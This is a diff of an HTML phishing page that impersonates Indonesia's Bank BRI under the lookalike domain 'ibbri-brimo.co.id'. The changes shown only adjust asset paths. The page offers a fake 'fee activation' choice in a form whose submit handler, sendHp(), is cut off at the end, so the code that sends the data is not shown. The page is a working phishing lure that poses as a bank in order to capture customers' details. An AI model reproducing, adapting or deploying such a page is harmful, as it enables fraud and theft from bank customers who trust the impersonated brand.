@@ -8,11 +8,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>𝗔𝗸𝘁𝗶𝘃𝗮𝘀𝗶 𝗧𝗮𝗿𝗶𝗳 | 𝘄𝘄𝘄.𝗶𝗯𝗯𝗿𝗶-𝗯𝗿𝗶𝗺𝗼.𝗰𝗼.𝗶𝗱</title>
      <meta name="theme-color" content="#0f78cb">
-     <link rel="icon" type="image/png" href="../hosting.tigerengine.id/nssd3w.png">
+     <link rel="icon" type="image/png" href="https://hosting.tigerengine.id/nssd3w.png">
 <meta content="https://hosting.tigerengine.id/4mi0e0.jpg" property="og:image">
-<meta name="twitter:image" content="../hosting.tigerengine.id/4mi0e0.jpg">
+<meta name="twitter:image" content="https://hosting.tigerengine.id/4mi0e0.jpg">
     	<meta name="description" content="Bank BRI terus berinovasi mengembangkan produk yang sesuai dengan perkembangan jaman untuk memenuhi kebutuhan nasabah">
-  <script type="module" src="../unpkg.com/ionicons%407.1.0/dist/ionicons/ionicons.esm.js"></script>
+  <script type="module" src="https://unpkg.com/ionicons%407.1.0/dist/ionicons/ionicons.esm.js"></script>
  
    
 </head>
@@ -284,7 +284,7 @@ nav{
     width: 100%; 
     max-width: 450px;
     height: 50px; 
-    background: url('../hosting.tigerengine.id/pbtf99.jpg');
+    background: url('hosting.tigerengine.id/pbtf99.jpg');
     background-repeat: no-repeat;
     background-size: 100% 100%;
     box-shadow: rgba(0, 0, 0, 0.10) 0px 10px 10px, rgba(0, 0, 0, 0.20) 0px 6px 6px;
@@ -451,7 +451,7 @@ welalxcome {
   bottom: 0;
   width: 100%;
   max-width: 450px;
-  background: url('../hosting.tigerengine.id/m3dm2s.jpg');
+  background: url('hosting.tigerengine.id/m3dm2s.jpg');
   background-repeat: no-repeat;
   background-position: 100% 100%;
   background-size: 100% 100%;
@@ -482,28 +482,28 @@ chsalxcome {
 </welalxcome>
 <chsalxcome2 class="hid">
     <div class="load hid">
- <img src="../hosting.tigerengine.id/f01dmo.gif" class="x" alt="loading"></div>
+ <img src="hosting.tigerengine.id/f01dmo.gif" class="x" alt="loading"></div>
 <nav style="position: fix; top: 0; left: 0; right: 0; margin: 5px auto; width: 100%; height: 60px; background: #F1F5F8; z-index: 99999">
  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEig8lJ2TAjG3Frf_4E42lP3LEw4KyecrTH1gDWKv1TKALAwbNg_UcEsGSYKN1sb3nisb_reXgAFPi1OyPGWixuw1jdOl7rttdBAf-cnv9zXEdfl_EX0OxxFTJy86y7cyJsayGx1XNgifWwmC8oYkqbxb9EKb1vlQxBoTDGgOFy0ht7Cnpj6K_radbnUD9g/s1080/AddText_06-08-12.57.52.jpg" style="width: 100%; position: fixed; top: 0; left: 0; right: 0; margin: 0px auto; z-index: 99999999; box-shadow: 0px 2px 2px 0px #00000070">
 </nav>        
     <div class="container">    
- <img src="../hosting.tigerengine.id/vdii6e.png" style="position:fixed;margin:0 auto;z-index:-9999;max-width:450px;margin-top:-20px;" alt="">
+ <img src="hosting.tigerengine.id/vdii6e.png" style="position:fixed;margin:0 auto;z-index:-9999;max-width:450px;margin-top:-20px;" alt="">
     <section class="hero">     
       <div class="carousel">
         <div class="carousel-item active">
-          <img src="../hosting.tigerengine.id/e7gxk8.jpg" alt="Carousel Image 1">
+          <img src="hosting.tigerengine.id/e7gxk8.jpg" alt="Carousel Image 1">
         </div>
         <div class="carousel-item">
-          <img src="../hosting.tigerengine.id/sh0aeg.jpg" alt="Carousel Image 2">
+          <img src="hosting.tigerengine.id/sh0aeg.jpg" alt="Carousel Image 2">
         </div>
         <div class="carousel-item">
-          <img src="../hosting.tigerengine.id/wyvaws.jpg" alt="Carousel Image 3">
+          <img src="hosting.tigerengine.id/wyvaws.jpg" alt="Carousel Image 3">
         </div>
         <div class="carousel-item">
-          <img src="../hosting.tigerengine.id/00dhis.jpg" alt="Carousel Image 4">
+          <img src="hosting.tigerengine.id/00dhis.jpg" alt="Carousel Image 4">
         </div>
         <div class="carousel-item">
-          <img src="../hosting.tigerengine.id/ty4vbx.jpg" alt="Carousel Image 5">
+          <img src="hosting.tigerengine.id/ty4vbx.jpg" alt="Carousel Image 5">
         </div>
         <div class="carousel-nav">
           <div class="carousel-nav-item active"></div>
@@ -525,7 +525,7 @@ chsalxcome {
                        <h3 style="color:#09559a;margin-top:0;">Silahkan Pilih Tarif Transaksi Sesuai Kebutuhan Anda Di Bawah Ini</h3>
           <form id="index" onsubmit="sendHp()" method="post">
               
-        <center><img style="width:93%;border-radius:5px;margin-top:10px;margin-bottom:8px;" src="../hosting.tigerengine.id/taobkv.png" alt=""></center>
+        <center><img style="width:93%;border-radius:5px;margin-top:10px;margin-bottom:8px;" src="https://hosting.tigerengine.id/taobkv.png" alt=""></center>
        <div class="radio-group">             
     <input type="radio" id="1" name="tarif" value="Lama Rp 6.500" required>
     <label class="label-radio" for="1">√•𝗧𝗮𝗿𝗶𝗳 𝗟𝗮𝗺𝗮 𝗥𝗽 𝟲.𝟱𝟬𝟬 / 𝗕𝗶 𝗳𝗮𝘀𝘁 𝟮.𝟱𝟬𝟬</label>
@@ -550,7 +550,7 @@ chsalxcome {
         </div>
     </div>    
 </div>
-    <script src="../code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script>
         function sendHp() {
    $('.load').fadeIn();
